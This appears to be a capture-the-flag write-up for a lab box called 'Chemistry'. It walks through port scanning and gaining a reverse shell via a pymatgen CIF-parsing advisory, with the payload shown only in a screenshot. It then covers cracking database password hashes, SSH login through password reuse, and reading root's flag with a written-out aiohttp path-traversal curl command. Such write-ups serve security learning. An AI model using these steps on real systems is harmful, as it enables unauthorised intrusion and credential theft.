{% from "macros.html" import console, image, text, code, list, link, header, script, imageModal %}

{{imageModal()}}

{{header("Enumeration", "enumeration")}}

{{text("We run a port scan.")}}

{{console("nmap -T5 -p- 10.10.200.176", "Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-28 21:14 CET
Warning: 10.10.11.38 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.11.38
Host is up (0.069s latency).
Not shown: 65065 closed tcp ports (reset), 468 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 206.70 seconds")}}

{{list(['22 (SSH)', '5000 (upnp)'])}}

{{text("Let's begin by checking out the web page on port 8000.")}}

{{text("It is a tool used for analysing <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>CIF</code> files.")}}

{{image("../../static/writeups/chemistry/images/000001.jpg")}}

{{text("I searched for known exploits that utilise uploading CIF files.")}}

{{link("https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f", "../../static/writeups/images/github.jpg", "Arbitrary code execution when parsing a maliciously crafted JonesFaithfulTransformation transformation_string
")}}

{{text("I modified the code a little, so that it would grant me a reverse shell.")}}

{{image("../../static/writeups/chemistry/images/000002.jpg")}}

{{text("I uploaded it onto the site, started a listener and viewed it.")}}

{{text("Now I had RCE on the target machine.")}}

{{image("../../static/writeups/chemistry/images/000003.jpg")}}

{{header("Shell as rosa", "shell-as-rosa")}}

{{text("I found a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>database.db</code> file in the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/home/app/instance</code> directory.")}}

{{text("After I downloaded it onto my machine, I used <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>sqlitebrowser</code> to browse through the data it contained.")}}

{{image("../../static/writeups/chemistry/images/000004.jpg")}}

{{text("There were a lot of accounts in the database. By using <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>crackstation.net</code> I was able to crack one of the hashes.")}}

{{image("../../static/writeups/chemistry/images/000005.jpg")}}

{{text("Now I had the password of user <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>rosa</code>. I confirmed the existence of such user because of his home folder and I guessed he reused his passwords.")}}

{{text("Logging in by SSH with the cracked password worked.")}}

{{header("Final flag", "final-flag")}}

{{text("Now as a user, I saw that there was a service running on port 8080, which was accessible only from the same machine.")}}

{{console("netstat -tulnp", "(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -          ")}}

{{text("I continued to gather more information about this service, and discovered what the server was running.")}}

{{console("curl localhost:8080 --head", "HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 5971
Date: Sun, 29 Dec 2024 10:31:45 GMT
Server: Python/3.9 aiohttp/3.9.1")}}

{{text("I search for known exploits for <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>aiohttp/3.9.1</code>.")}}

{{link("https://github.com/jhonnybonny/CVE-2024-23334", "../../static/writeups/images/github.jpg", "CVE-2024-23334 PoC")}}

{{text("I only used the same command that the script did, with a slight tweak.")}}

{{console("curl --path-as-is localhost:8080/assets/../../../../../root/root.txt")}}

{{image("../../static/writeups/chemistry/images/000006.jpg")}}

{{script()}}